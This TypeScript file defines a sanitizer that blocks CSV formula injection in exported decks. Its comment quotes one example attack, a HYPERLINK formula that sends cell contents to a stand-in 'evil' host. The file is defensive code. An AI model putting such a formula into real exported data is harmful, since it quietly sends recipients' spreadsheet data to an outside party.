/**
 * Neutralize CSV / formula injection.
 *
 * Spreadsheet apps (Excel, LibreOffice, Google Sheets) evaluate a cell as a
 * formula when its text begins with `=`, `+`, `-`, `@`, or a leading tab /
 * carriage return. A dictionary field a user typed such as
 * `=HYPERLINK("http://evil.tld/steal?x="&A1,"click")` would then execute when
 * *someone else* opens an exported deck (collaborators and forked/public decks
 * mean the exporter isn't always the author). CSV has no cell typing, so the
 * opening app decides based on the leading character.
 *
 * Prefixing a single quote forces the app to treat the value as literal text.
 * Excel/Sheets consume that leading quote, so it stays invisible there; it is
 * only visible in plain-text readers — an acceptable trade for safety. Quoting
 * of embedded commas/quotes/newlines is handled separately by `csv-stringify`.
 */
const FORMULA_TRIGGERS = /^[=+\-@\t\r]/

export function sanitizeCsvCell(value: string): string {
  if (typeof value !== "string" || value.length === 0) return value
  return FORMULA_TRIGGERS.test(value) ? `'${value}` : value
}
